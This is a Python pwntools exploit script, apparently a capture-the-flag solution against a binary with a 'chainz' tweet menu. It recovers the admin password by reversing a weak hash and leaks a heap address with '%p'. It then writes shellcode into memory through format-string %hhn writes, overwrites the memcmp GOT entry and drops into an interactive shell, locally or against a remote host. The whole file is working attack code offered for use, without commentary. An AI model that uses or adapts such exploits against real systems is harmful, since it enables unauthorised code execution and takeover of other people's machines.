#!/usr/bin/env python2

from pwn import *
import sys
import binascii
import re

env = ""
binary = ""

ip = None
port = None

b = None
p = None

loot = {
}

def get_hash(username, salt):
    p.recvuntil("Enter Username:")
    p.sendline(username + salt)
    p.recvuntil("Enter Salt:")
    p.recvuntil("Generated Password:\n")
    password = p.recvline().strip()
    p.sendline("")
    return password

def rev_hash(hash, username, salt):

    username = username[:-1] + "\x00"
    salt = salt[:-1] + "\x00"

    parts = list(map(''.join, zip(*[iter(hash)]*4)))
    hash = ''.join([s[::-1] for s in parts])

    intermediate = ""
    for i in range(len(hash)):
        intermediate += chr(ord(hash[i]) ^ ord(username[i]))

    password = ""
    for i in range(len(intermediate)):
        password += chr(ord(intermediate[i]) - ord(salt[i]) & 0xff)

    return binascii.hexlify(password)

def maybe_admin(password):
    p.sendline("3")
    p.sendline(password)
    p.sendline("")
    p.clean()

def tweet(msg):
    p.sendline("1")
    p.sendline(msg)
    p.sendline("")
    p.clean()

def view_chainz():
    p.sendline("2")
    p.sendline("")
    tweets = re.findall("-(.+)-", p.recvuntil("\n\n"))[:-1]
    p.clean()
    return tweets

def get_last_message():
    p.sendline("4")
    p.sendline("")
    p.recvuntil("2: View Chainz")
    last_message = re.findall("-\x1b\[1;33m(.+)\x1b\[0;36m-", p.recvuntil("4: Print Banner"))[0]
    p.clean()
    return last_message

def write_bytes_at_addr(address, bytes):
    for i, byte in enumerate(bytes):
        addr = p32(address + i)
        n = u8(byte) + 0x100 - 4

        n = str(n).rjust(3,"0")
        format = "%%%sx%s%%9$hhn" % (n, addr)
        tweet(format)

def exploit():
    global b, p, settings

    load_env()
    username = "\x01" * 0x10
    salt = "\x01" * 0x10

    hash = get_hash(username, salt)
    password = rev_hash(binascii.unhexlify(hash), username, salt)

    log.info("Current hash : %s" % hash)
    log.info("Password ... : %s" % password)

    maybe_admin(binascii.unhexlify(password))

    tweet("%p")
    loot['heap'] = int(get_last_message()[:-1], 16) + 0x10000
    log.info("Heap ....... : 0x%x" % loot['heap'])

    log.info("Writing shellcode...")
    shellcode = asm(shellcraft.sh())
    write_bytes_at_addr(loot['heap'], shellcode)
    write_bytes_at_addr(b.got['memcmp'], p32(loot['heap']))

    log.info("Shell incoming!")
    p.sendline("3")
    p.sendline("Popping shell!")
    p.clean()
    p.interactive()

def load_env():
    global b, p

    b = ELF(binary)

    if env == "local":
        p = process([binary])
        log.info(util.proc.pidof(p))
        pause()

    elif env == "remote":
        p = remote(ip, port)


def usage():
    print "Usage: ./%s [binary] [local|remote] <ip> <port>" % sys.argv[0]


if __name__ == '__main__':
    args = sys.argv

    if len(args) < 3:
        usage()
        exit()

    binary = sys.argv[1]
    env = sys.argv[2]

    if env == "remote":
        if len(args) != 5:
            usage()
            exit()
        else:
            ip = sys.argv[3]
            port = int(sys.argv[4])

    exploit()
